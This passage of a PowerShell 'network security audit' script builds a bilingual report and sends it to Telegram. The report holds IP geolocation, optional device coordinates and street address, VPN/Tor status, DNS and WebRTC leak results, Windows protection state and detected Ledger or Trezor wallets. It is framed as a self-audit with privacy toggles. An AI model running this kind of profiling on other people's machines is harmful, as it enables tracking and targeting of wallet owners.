# OpenAI / external AI review deliberately removed by request.
# Every report conclusion comes from deterministic rules and evidence.

Write-Host '[6/6] Telegram report and local copy' -ForegroundColor Cyan
$overview=@"
🌐 NETWORK SECURITY AUDIT
🕒 $(Get-Date -Format 'yyyy-MM-dd HH:mm zzz')
🖥 OS: $(OneLine $os)
⭐ Risk score (heuristic): $score / 100
📊 Verdict: $tier
🔎 Confidence: $confidence

🌍 PUBLIC NETWORK / ГЕОЛОКАЦИЯ
Public IPv4: $(OneLine $publicV4)
Public IPv6: $(OneLine $publicV6 'Not reachable')
Country: $(OneLine $net.location.country_code) — $(OneLine $net.location.country)
Region: $(OneLine $net.location.region)
City: $(OneLine $net.location.city)
Street / House: unresolvable from IP
Device location service: $($deviceLocation.status)
Device location accuracy: $(if($deviceLocation.status -eq 'OK'){'~'+$deviceLocation.accuracy_m+' m'}else{'N/A'})
$(if($telegramLocationPermission){'Device coordinates: '+$deviceLocation.latitude+', '+$deviceLocation.longitude+'`nDevice approximate street: '+(OneLine $deviceLocation.approximate_address 'not determined')+'`nMap data: '+(OneLine $deviceLocation.attribution 'N/A')}else{'Precise device position: LOCAL ONLY / НЕ ПЕРЕДАЕТСЯ'})
Postal (approx.): $(OneLine $net.location.postal)
Time zone: $(OneLine $net.location.timezone)
ISP: $(OneLine $isp)
ASN: $(OneLine $asn)

🔐 VPN / PROXY / TOR
VPN: $(Status-Text $vpnDiagnostics.status)
VPN (local tunnel): $($vpnDiagnostics.local_tunnel)
VPN (public IP): $($vpnDiagnostics.external_exit_ip)
VPN connection details: $(if($vpnDiagnostics.evidence.Count){$vpnDiagnostics.evidence -join '; '}else{'No active VPN profiles/adapters detected'})
Proxy: $(Status-Text $proxyDiagnostics.status)
Proxy (public IP): $proxyIntelStatus
Proxy settings: $(if($proxyDiagnostics.evidence.Count){$proxyDiagnostics.evidence -join '; '}else{'No explicit proxy settings detected'})
Proxy auto config: $(if($proxyDiagnostics.possible.Count){$proxyDiagnostics.possible -join '; '}else{'Not detected'})
Tor: $(Status-Text $torDiagnostics.status)
Tor process: $($torDiagnostics.tor_process)
Tor SOCKS (9050/9150): $($torDiagnostics.socks_ports)
Tor exit (official Tor list): $($torDiagnostics.exit_ip_tor_project)
Tor exit (IP reputation): $($torDiagnostics.exit_ip_ip_intelligence)
Tor check note: $($torDiagnostics.list_note)
Note: NOT DETECTED != guaranteed absent; browser/application-specific tunnels need their own checks.

📡 LOCAL NETWORK / ЛОКАЛЬНАЯ СЕТЬ
Adapter: $(OneLine $net.active_adapter)
Link speed: $(OneLine $net.link_speed)
$(if($IncludeLocalDetails){"Local IPv4: $($ipv4 -join ', ')`nGateway: $gateway`nRouter MAC: $(OneLine $gatewayMac)`nDHCP server: $(OneLine $dhcpServer)`nConfigured DNS: $($dnsList -join ', ')"}else{'Local IPv4, gateway and DNS: omitted from Telegram for privacy'})
Wi-Fi signal: $(OneLine $wifi.signal_percent 'N/A')%
Wi-Fi channel: $(OneLine $wifi.channel 'N/A')
Ping 1.1.1.1: $(OneLine $pingWan.avg_ms 'N/A') ms
Packet loss (3): $($pingWan.loss_percent)%
Gateway ping: $(if($pingGate){OneLine $pingGate.avg_ms 'N/A'}else{'N/A'}) ms
Bottleneck: $($bottleneck -join '; ')
"@
$securityText=@"
🛡 SECURITY / ЗАЩИТА
Windows Firewall: $(if($firewall){(@($firewall | ForEach-Object {"$($_.Name)=$($_.Enabled)"}) -join '; ')}else{'Unknown'})
Secure Boot: $(if($null -eq $secureBoot){'Unknown'}else{$secureBoot})
BitLocker OS volume: $(if($systemVolume){$systemVolume.ProtectionStatus}else{'Unknown'})
Defender real-time: $(if($defender){$defender.RealTimeProtectionEnabled}else{'Unknown'})

🔌 HARDWARE WALLETS / АППАРАТНЫЕ КОШЕЛЬКИ
LEDGER: $(Status-Text $walletReport.ledger.status)
Ledger detected USB/HID entries: $($walletReport.ledger.interfaces_detected)
$(if($walletReport.ledger.devices.Count -gt 0){@($walletReport.ledger.devices | ForEach-Object {('• '+$_.name+' ['+$_.vid_pid+'] / PnP: '+$_.driver_status)}) -join "`n"}else{'Ledger details: no present matching interfaces or inventory unavailable'})
TREZOR: $(Status-Text $walletReport.trezor.status)
Trezor detected USB/HID entries: $($walletReport.trezor.interfaces_detected)
$(if($walletReport.trezor.devices.Count -gt 0){@($walletReport.trezor.devices | ForEach-Object {('• '+$_.name+' ['+$_.vid_pid+'] / PnP: '+$_.driver_status)}) -join "`n"}else{'Trezor details: no present matching interfaces or inventory unavailable'})
Hardware check source: $($walletReport.source)
Hardware privacy: no serials, wallet addresses, seeds or keys collected.
Sensitive listening ports: $(if(@($exposedListeners).Count){(@($exposedListeners | Select-Object -ExpandProperty LocalPort -Unique) -join ', ')}else{'none found'})
Gateway port checks: $(if($CheckGatewayPorts){($gatewayPorts | ConvertTo-Json -Compress)}else{'not requested'})

🧪 LEAK TESTS / УТЕЧКИ
System DNS: $($dnsLeak.status)
System observed resolvers: $($dnsLeak.observed_resolvers.Count)
System DNS verdict (provider): $(OneLine $dnsLeak.vendor_conclusion 'Not reported')
$(if($IncludeLocalDetails){'System resolver IPs: '+(@($dnsLeak.observed_resolvers | ForEach-Object {$_.ip}) -join ', ')}else{'System DNS IPs omitted from Telegram'})
Browser DNS: $($browserDns.status)
Browser observed resolvers: $($browserDns.observed_resolvers.Count)
Browser DNS verdict (provider): $(OneLine $browserDns.vendor_conclusion 'Not reported')
$(if($IncludeLocalDetails){'Browser resolver IPs: '+(@($browserDns.observed_resolvers | ForEach-Object {$_.ip}) -join ', ')}else{'Browser DNS IPs omitted from Telegram'})
WebRTC status: $($webrtc.status)
WebRTC STUN public IPv4: $($webrtcPublicCandidates -join ', ')
WebRTC HTTP/IP discrepancy: $($webrtcMismatch.Count)
WebRTC host IPs: $(if($IncludeLocalDetails){$webrtcHostIPs -join ', '}else{'omitted from Telegram'})
Expected VPN IP: $(OneLine $ExpectedVpnPublicIPv4 'not provided')
⚠ Different DNS/IP paths are indicators, not definitive leaks without expected baseline.

🇷🇺 ИТОГ
$($assessment.local_summary_ru)

🇬🇧 SUMMARY
$($assessment.local_summary_en)
"@
$pngPath=Join-Path $OutputDir ("network_audit_${stamp}.png")
if($SendReportImage) {
    $pngRows=@(
      [pscustomobject]@{kind='section';text='PUBLIC NETWORK / ВНЕШНЯЯ СЕТЬ'},
      [pscustomobject]@{kind='row';text=('IPv4: '+(OneLine $publicV4)+'  |  IPv6: '+(OneLine $publicV6 'N/A'))},
      [pscustomobject]@{kind='row';text=('Location (IP-based): '+(OneLine $net.location.city)+', '+(OneLine $net.location.region)+', '+(OneLine $net.location.country))},
      [pscustomobject]@{kind='row';text=('ISP: '+(OneLine $isp)+'  |  ASN: '+(OneLine $asn))},
      [pscustomobject]@{kind='section';text='PRIVACY / ПРИВАТНОСТЬ'},
      [pscustomobject]@{kind='row';text=('VPN: '+$vpnDiagnostics.status+'   Proxy: '+$proxyDiagnostics.status+'   Tor: '+$torDiagnostics.status)},
      [pscustomobject]@{kind='row';text=('DNS: '+$dnsLeak.status+'   Browser DNS: '+$browserDns.status+'   WebRTC: '+$webrtc.status)},
      [pscustomobject]@{kind='section';text='LOCAL NETWORK / СЕТЬ'},
      [pscustomobject]@{kind='row';text=('Adapter: '+(OneLine $net.active_adapter)+'  |  Wi-Fi: '+(OneLine $wifi.signal_percent 'N/A')+'%')},
      [pscustomobject]@{kind='row';text=('Gateway: '+$(if($IncludeLocalDetails){$gateway}else{'hidden'})+'   Ping: '+(OneLine $pingWan.avg_ms 'N/A')+' ms   Loss: '+$pingWan.loss_percent+'%')},
      [pscustomobject]@{kind='section';text='SECURITY / ЗАЩИТА WINDOWS'},
      [pscustomobject]@{kind='row';text=('Secure Boot: '+(OneLine $secureBoot 'unknown')+'   BitLocker: '+$(if($systemVolume){$systemVolume.ProtectionStatus}else{'unknown'}))},
      [pscustomobject]@{kind='row';text=('Defender: '+$(if($defender){$defender.RealTimeProtectionEnabled}else{'unknown'}))},
      [pscustomobject]@{kind='row';text=('Ledger: '+$walletReport.ledger.status+'   Trezor: '+$walletReport.trezor.status)},
      [pscustomobject]@{kind='section';text='WINDOWS LOCATION / ГЕОЛОКАЦИЯ'},
      [pscustomobject]@{kind='row';text=('Status: '+$deviceLocation.status+' | Accuracy: '+$(if($deviceLocation.status -eq 'OK'){'~'+$deviceLocation.accuracy_m+' m'}else{'N/A'}))},
      [pscustomobject]@{kind='row';text=$(if($telegramLocationPermission){'Coordinates: '+$deviceLocation.latitude+', '+$deviceLocation.longitude}else{'Exact coordinates: LOCAL ONLY / НЕ ПЕРЕДАЮТСЯ'})},
      [pscustomobject]@{kind='row';text=$(if($telegramLocationPermission){'Approx. address: '+(OneLine $deviceLocation.approximate_address 'not available')}else{'Street/house: not included in Telegram'})},
      [pscustomobject]@{kind='section';text='ИТОГ / SUMMARY'},
      [pscustomobject]@{kind='row';text=$assessment.local_summary_ru},
      [pscustomobject]@{kind='row';text=$assessment.local_summary_en}
    )
    try { New-AuditPng $pngPath $pngRows $score $tier }catch{$script:errorsList.Add('Screenshot: '+$_.Exception.Message);Write-Warning ('Real screenshot capture failed (NO substitute image): '+$_.Exception.Message)}
}
if($SendTelegram) {
    if([string]::IsNullOrWhiteSpace($TelegramBotToken) -or $TelegramBotToken -eq 'PASTE_NEW_BOT_TOKEN_HERE') {
        Write-Warning 'Telegram skipped: put a NEW token in TG_BOT_TOKEN (PowerShell env var). Current leaked token should be revoked.'
        $SendTelegram=$false
    } elseif(@(Tg-TargetIds).Count -eq 0) {
        Write-Warning 'Telegram skipped: no valid numeric chat IDs.'
        $SendTelegram=$false
    }
}
if($SendTelegram) {
    try {
        Send-TgLong 'Network Audit • 1/3 • Network + VPN' $overview
        Send-TgLong 'Network Audit • 2/3 • Security + Hardware Wallets' $securityText
        $issues=@($findings | ForEach-Object {"[$($_.level)] RU: $($_.ru)`nEN: $($_.en)"})
        if($issues.Count -gt 0){Send-TgLong 'Network Audit • 3/3 • Findings' ($issues -join "`n`n")}
        Send-TgLong 'Audit method / Метод проверки' 'RULE-BASED LOCAL ASSESSMENT. No AI API is called. Checks are not penetration testing.
ОЦЕНКА ПО ЛОКАЛЬНЫМ ПРАВИЛАМ. Вызовов ИИ нет. Проверки не заменяют пентест.'
        Send-TgDocument $jsonTelegramPath
        Send-TgPhoto $pngPath
        if($sentTo.Count -gt 0){Write-Host ('Telegram delivered to chat ID(s): '+($sentTo.ToArray() -join ', ')) -ForegroundColor Green}
        if($telegramFailures.Count -gt 0){
            foreach($failure in $telegramFailures.ToArray()){Write-Warning $failure}
            Write-Warning 'If Telegram returns 403, the user must open the bot and press START. 400 may mean invalid chat ID.'
        }

    } catch {Write-Warning ('Telegram failed: '+$_.Exception.Message.Replace($TelegramBotToken,'[BOT_TOKEN_REDACTED]'))}
}
$summaryPath=Join-Path $OutputDir ("network_audit_${stamp}.txt")
(@($overview,$securityText,('FINDINGS / НАХОДКИ' + "`n" + ((@($findings | ForEach-Object {$_.ru+' / '+$_.en}) -join "`n"))),('ASSESSMENT METHOD' + "`n" + 'Local deterministic rules only; no AI API used')) -join "`n`n") | Set-Content -Path $summaryPath -Encoding UTF8
Write-Host "JSON: $jsonPath" -ForegroundColor Green
Write-Host "TXT:  $summaryPath" -ForegroundColor Green
if(Test-Path $pngPath){Write-Host "IMAGE:  $pngPath" -ForegroundColor Green}
if($telegramFailures.Count -gt 0){
    ('TELEGRAM SEND ERRORS' + "`n" + ($telegramFailures.ToArray() -join "`n")) | Add-Content -Path $summaryPath -Encoding UTF8
}

Write-Host "FINAL: $score/100 | $tier | Confidence: $confidence" -ForegroundColor Yellow
if(-not $SendTelegram){Write-Host 'Telegram not sent (disabled or missing token). Set TG_BOT_TOKEN to enable sending.' -ForegroundColor DarkYellow}
